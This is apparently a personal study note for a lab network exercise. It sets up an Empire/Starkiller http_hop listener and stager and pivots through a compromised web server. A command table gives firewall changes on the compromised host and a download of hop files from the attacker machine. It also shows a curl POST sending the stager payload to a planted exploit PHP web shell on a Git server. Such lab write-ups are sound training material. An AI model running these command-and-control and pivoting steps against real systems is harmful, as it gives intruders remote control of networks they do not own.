Time to put this all into practice!

You should already have a `http_hop` listener started in either Empire or Starkiller from the last task. If you don't, take this opportunity to start one before continuing.

With the listener started there are two things we must do before we can get an agent back from the Git Server:-

- We must generate an appropriate stager for the target
- We must put the `http_hop` files into position on .200, and start a webserver to serve the files on the port we selected during the listener creation. This server must be able to execute PHP, so a PHP Debug server is ideal.


---

Let's start with generating a stager. For this we will use the `multi/launcher` stager. We already covered how to create stagers back in task 26, so you should be able to do this relatively unguided. The only option needing to be set here is the "Listener" option, which needs set to the name of the `http_hop` listener we created in the previous task:

## Empire client

Start Empire Client:

```
$ powershell-empire client
```


![[Git Server-20250103140519820.webp]]

## Starkiller

![[Git Server-20250103140607340.webp]]

If using the Empire CLI, you will be presented with a payload to copy and paste into the target's command line:

![[Git Server-20250103140856420.webp]]

If using Starkiller you can copy the payload to your clipboard by clicking on the copy button of the Actions menu for the stager in the main Stagers menu:

![[Git Server-20250103140929490.webp]]

Whichever method you chose, save the provided command somewhere and _do not_ execute it yet. We will need it once we have set up the hop files on the jumpserver.


---
## Jumpserver set up

Now let's get that jumpserver set up!

1. First of all, in the /tmp directory of the compromised webserver, create and enter a directory called `hop-USERNAME`. e.g.:

	![[Git Server-20250103141203892.webp]]

2. Transfer the contents from the `/tmp/http_hop` (or whatever you called it) directory across to this directory on the target server. A good way to do this is by zipping up the contents of the directory (`cd /tmp/http_hop && zip -r hop.zip *`), then transferring the zipfile across using one of the methods previously shown. For example, doing this with a Python HTTP server :
	![[Git Server-20250103141930263.webp]]

3. We can then unzip the zipfile on the webserver (i.e. `unzip hop.zip`):

	 ![[Git Server-20250103142317960.webp]]

> [!Note]
The output of `ls` must match up with the screenshot -- i.e. there should be a `news.php` file in your current directory, with `admin/` and_ `login/` as subdirectories

## Open the port in the firewall

Create a Firewall rule to allow connections through.
		root@prod-serv ~# `firewall-cmd --zone=public --add-port 47000/tcp`

## Serving the files

We now need to actually serve the files on the port we chose when generating the http_hop listener (task 28). Fortunately we already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files! The syntax for this is as follows:  
`php -S 0.0.0.0:PORT &>/dev/null &`  

e.g:

![[Git Server-20250103142653235.webp]]

As shown in the screenshot, the webserver is now listening in the background on the chosen port 47000.

> [!Note]
> Remember to open up the port in the firewall if you haven't already!

This is a handy trick for when we need to serve PHP files, as our standard Python HTTP webserver is not capable of interpreting the PHP language and so cannot execute the scripts.

We now have everything we need to get this show on the road!


---

# Your job

![[Command & Control Empire Diagram.svg]]



The way this system works is:
- There is a **command server**, usually your Attacking Machine.
- This command server has a listener or number of listeners on it, waiting for connections from your agents. 
- These listeners come in various options but the most used ones are HTTP and *HTTP-Hop* mainly because they can blend into normal day-to-day traffic easier.

**HTTP-Hop**
This is a special listener because it allows you to set up a hop station should you be pivoting around a network. What this essentially does is allows us to take an entry point in the network and make use of it as a “jump” server between our command server and a compromised device that doesn’t have internet connectivity for example:

**Command Server <—–> Web Server <—-> Compromised Machine**

The next part is the **stager**.
- This is a script/command that creates our agent. 
- This comes in a number of forms but *Bash* and *Powershell* are the ones introduced in the Wreath room. 
- Once these stagers are run on your compromised machine they will create an **agent** connection back to your control server. 
- Once connected you will be able to run commands as if you were on the agent through the command server.

| <center>Actions</center>                                                        | <center>Machine</center> | <center>Commands</center>                                                                                             |
| ------------------------------------------------------------------------------- | ------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| Start Empire Server                                                             | Attacking Machine        | `powershell-empire server`                                                                                            |
| Start Empire CLI                                                                | Attacking Machine        | `powershell-empire client`                                                                                            |
| Setup HTTP Listener                                                             | Empire CLI               | `uselistener http`                                                                                                    |
| Create a listener                                                               | Empire CLI               | [[Empire - Listeners]]                                                                                                |
| Setup Stager                                                                    | Empire CLI               | `usestager multi_bash`<br>`set Listener CLIHTTP`<br>`execute`                                                         |
| Open firewall port                                                              | Jump box .200            | `firewall-cmd --zone=public --add-port 47000/tcp`                                                                     |
| Execute stager on target                                                        | Jump box .200            | `echo "import sys,base64,warnings...`                                                                                 |
| Creating hop jump server                                                        | Empire CLI               | `uselistener http_hop`<br>`set Host 10.200.X.200` <br>`set Port 47000`<br>`set RedirectListener CLIHTTP`<br>`execute` |
| Zip and transfer files `/tmp/http_hop` to jump box target                       | Attacking Machine        | `cd /tmp/http_hop && zip -r hop.zip`<br>`sudo python3 -m http.server 80`                                              |
| Download on target                                                              | Jump box .200            | `curl 10.50.X.X/hop.zip -o hop.zip unzip hop.zip`                                                                     |
| **IF YOU ALREADY HAVE DONE ALL THE PREVIOU STEPS DON'T NEED TO REPEAT IT**      |                          |                                                                                                                       |
| Create http_hop stager                                                          | Empire CLI               | `usestager multi_launcher`<br>`set Listener http_hop` <br>`execute`                                                    |
| Setup a PHP Server to host http_hop files                                       | Jump box .200            | `php -S 0.0.0.0:47000`                                                                                                |
| Connect to `git-server` on `.150` and execute `usestager/multi_launcher` agent. | Attacking Machine        | `curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=<usestager/multi_launcher payload>"`<br>              |
After completing the given steps, we have an agent from the Git Server in Starkiller.

![[Git Server-20250114152251549.webp]]

**Next step:** [[Empire - Modules]]

